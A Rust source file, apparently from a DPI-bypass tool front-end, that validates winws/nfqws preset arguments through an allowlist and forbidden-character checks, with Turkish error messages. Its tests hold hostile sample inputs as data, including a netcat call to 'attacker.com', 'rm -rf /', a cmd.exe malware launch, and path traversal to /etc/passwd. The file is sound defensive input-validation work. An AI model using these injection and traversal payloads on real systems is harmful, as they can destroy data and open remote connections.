use crate::engine::error::EngineError;

const MAX_ARG_COUNT: usize = 30;
const MAX_ARG_LEN: usize = 128;

const ALLOWED_PREFIXES: &[&str] = &[
    "--filter-tcp=",
    "--filter-udp=",
    "--wf-tcp=",
    "--wf-udp=",
    "--windivert=",
    "--windivert",
    "tcp.",
    "udp.",
    "icmp.",
    "--qnum=",
    "--wl=",
    "--hostlist=",
    "--dpi-desync=",
    "--dpi-desync-http=",
    "--dpi-desync-https=",
    "--dpi-desync-quic=",
    "--dpi-desync-split-pos=",
    "--dpi-desync-repeats=",
    "--dpi-desync-fooling=",
    "--dpi-desync-ttl=",
    "--dpi-desync-ttl-ext=",
    "--dpi-desync-cutoff=",
    "--dpi-desync-any-protocol",
    "--dpi-desync-autottl",
    "--dpi-desync-split-http-req=",
    "--dpi-desync-split-pos-http-req=",
    "--dpi-desync-split-tls=",
    "--dpi-desync-split-pos-tls=",
    "--dpi-desync-fake-tls-sni=",
    "--dpi-desync-fake-http=",
    "--dpi-desync-fake-tls=",
    "--dpi-desync-fake-quic=",
    "--dpi-desync2=",
    "--mss=",
    "--new-ttl=",
    "--max-payload=",
    "--tcp-window-size=",
    "--bind-addr=",
    "--http=",
    "--debug",
    "--debug2",
];

const FORBIDDEN_CHARS: &[char] = &[
    '&', ';', '|', '`', '$', '<', '>', '\'', '"', '\\', '/', '\n', '\r', '\0',
];

pub fn validate_preset_args(args: &[String]) -> Result<(), EngineError> {
    if args.len() > MAX_ARG_COUNT {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman sayısı limiti aşıldı: {} > {} (izin verilen maksimum).",
            args.len(), MAX_ARG_COUNT
        )));
    }

    for arg in args {
        validate_single_arg(arg)?;
    }

    Ok(())
}

fn validate_single_arg(arg: &str) -> Result<(), EngineError> {
    if arg.len() > MAX_ARG_LEN {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman çok uzun ({} karakter > {} limit): \"{}…\"",
            arg.len(), MAX_ARG_LEN,
            &arg[..MAX_ARG_LEN.min(32)]
        )));
    }

    if arg.is_empty() {
        return Err(EngineError::InvalidPreset(
            "Boş argüman kabul edilmiyor.".into()
        ));
    }

    for &ch in FORBIDDEN_CHARS {
        if arg.contains(ch) {
            return Err(EngineError::InvalidPreset(format!(
                "Güvenli olmayan karakter '{:?}' argümanda tespit edildi: \"{}\"",
                ch, sanitize_for_log(arg)
            )));
        }
    }

    let is_allowed = ALLOWED_PREFIXES.iter().any(|prefix| {
        arg == *prefix || arg.starts_with(prefix)
    });

    if !is_allowed {
        return Err(EngineError::InvalidPreset(format!(
            "Tanınmayan argüman reddedildi: \"{}\". \
             Yalnızca bilinen winws/nfqws parametreleri kabul edilir.",
            sanitize_for_log(arg)
        )));
    }

    if let Some(val) = arg.strip_prefix("--hostlist=") {
        validate_hostlist_value(val)?;
    } else if let Some(val) = arg.strip_prefix("--wl=") {
        if validate_ip_or_domain(val).is_err() {
            validate_hostlist_value(val)?;
        }
    }

    Ok(())
}

fn validate_hostlist_value(val: &str) -> Result<(), EngineError> {
    if val.is_empty() {
        return Err(EngineError::InvalidPreset("Hostlist değeri boş olamaz".into()));
    }
    if val.contains("..") {
        return Err(EngineError::InvalidPreset("Dizin geçişi (..) tespit edildi".into()));
    }
    if val.contains("//") {
        return Err(EngineError::InvalidPreset("Çift taksim (//) tespit edildi".into()));
    }
    if val.contains('\\') {
        return Err(EngineError::InvalidPreset("Ters taksim (\\) tespit edildi".into()));
    }
    if val.contains('\0') {
        return Err(EngineError::InvalidPreset("Null karakter tespit edildi".into()));
    }
    if val.contains('%') {
        return Err(EngineError::InvalidPreset("Yüzde işareti (%) veya URL encoding tespit edildi".into()));
    }
    if val.starts_with('/') {
        return Err(EngineError::InvalidPreset("Mutlak yol (Linux) kabul edilmiyor".into()));
    }
    let chars: Vec<char> = val.chars().collect();
    if chars.len() >= 2 && chars[1] == ':' && chars[0].is_ascii_alphabetic() {
        return Err(EngineError::InvalidPreset(
            "Sürücü harfi içeren mutlak yol kabul edilmiyor".into(),
        ));
    }
    Ok(())
}

fn validate_ip_or_domain(val: &str) -> Result<(), EngineError> {
    if val.is_empty() {
        return Err(EngineError::InvalidPreset("IP veya domain değeri boş olamaz".into()));
    }
    for c in val.chars() {
        if !c.is_ascii_alphanumeric() && c != '.' && c != '_' && c != '-' {
            return Err(EngineError::InvalidPreset(format!("Geçersiz karakter '{}' IP/domain içinde tespit edildi", c)));
        }
    }
    if val.contains("..") {
        return Err(EngineError::InvalidPreset("Çift nokta (..) tespit edildi".into()));
    }
    Ok(())
}

fn sanitize_for_log(s: &str) -> String {
    s.chars()
        .take(48)
        .map(|c| if c.is_control() { '?' } else { c })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_args_pass() {
        let args = vec![
            "--wf-tcp=80,443".to_string(),
            "--dpi-desync=fake".to_string(),
            "--dpi-desync-autottl".to_string(),
            "--mss=1300".to_string(),
            "--filter-tcp=80".to_string(),
            "--windivert".to_string(),
            "tcp.DstPort==443".to_string(),
            "--qnum=200".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_shell_injection_rejected() {
        let payloads = vec![
            "--dpi-desync=fake && cmd.exe /c malware.exe",
            "--mss=1300; rm -rf /",
            "--wf-tcp=80|nc attacker.com 4444",
            "--dpi-desync=`whoami`",
            "--mss=$(evil)",
        ];
        for payload in payloads {
            let args = vec![payload.to_string()];
            assert!(
                validate_preset_args(&args).is_err(),
                "Injection geçmemeli: {}",
                payload
            );
        }
    }

    #[test]
    fn test_unknown_arg_rejected() {
        let args = vec!["--unknown-flag=value".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_empty_arg_rejected() {
        let args = vec!["".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_too_many_args_rejected() {
        let args: Vec<String> = (0..=MAX_ARG_COUNT)
            .map(|_| "--dpi-desync-autottl".to_string())
            .collect();
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_arg_too_long_rejected() {
        let long_arg = format!("--dpi-desync={}", "x".repeat(MAX_ARG_LEN));
        let args = vec![long_arg];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_path_traversal_rejected() {
        let payloads = vec![
            "../../../etc/passwd",
            "--hostlist=../../../etc/passwd",
            "--hostlist=C:/Windows/win.ini",
            "--hostlist=..\\..\\Windows\\win.ini",
        ];
        for payload in payloads {
            let args = vec![payload.to_string()];
            assert!(
                validate_preset_args(&args).is_err(),
                "Path traversal did not fail: {}",
                payload
            );
        }
    }

    #[test]
    fn test_windivert_args_pass() {
        let args = vec![
            "--windivert".to_string(),
            "--windivert=filter".to_string(),
            "tcp.DstPort==443".to_string(),
            "udp.DstPort==443".to_string(),
            "icmp.Type==8".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_linux_qnum_arg_passes() {
        let args = vec!["--qnum=200".to_string()];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_hostlist_args_pass() {
        let args = vec![
            "--hostlist=list.txt".to_string(),
            "--wl=example.com".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn unsupported_tpws_and_ipset_args_are_rejected() {
        for arg in ["--socks=127.0.0.1:1080", "--ipset=targets.txt"] {
            assert!(
                validate_preset_args(&[arg.to_string()]).is_err(),
                "unsupported feature was accepted: {arg}"
            );
        }
    }

    use proptest::prelude::*;

    proptest! {
        #[test]
        fn path_traversal_always_rejected(s in ".*") {
            let arg = format!("--hostlist={}", s);
            let has_traversal = s.contains("..")
                || s.contains("//")
                || s.contains('\\')
                || s.contains('\0')
                || s.contains('%')
                || s.starts_with('/')
                || (s.len() >= 2 && s.chars().nth(0).unwrap().is_ascii_alphabetic() && s.chars().nth(1).unwrap() == ':');

            let result = validate_single_arg(&arg);
            if has_traversal {
                assert!(result.is_err(), "Expected error for: {}", s);
            }
        }

        #[test]
        fn valid_ip_or_domain_always_accepted(s in "[a-zA-Z0-9_-]{1,20}(\\.[a-zA-Z0-9_-]{1,20})*") {
            let arg = format!("--wl={}", s);
            let result = validate_single_arg(&arg);
            if !s.contains("..") && s.len() + 5 <= MAX_ARG_LEN {
                assert!(result.is_ok(), "Expected ok for: {}, got {:?}", s, result);
            }
        }
    }
}
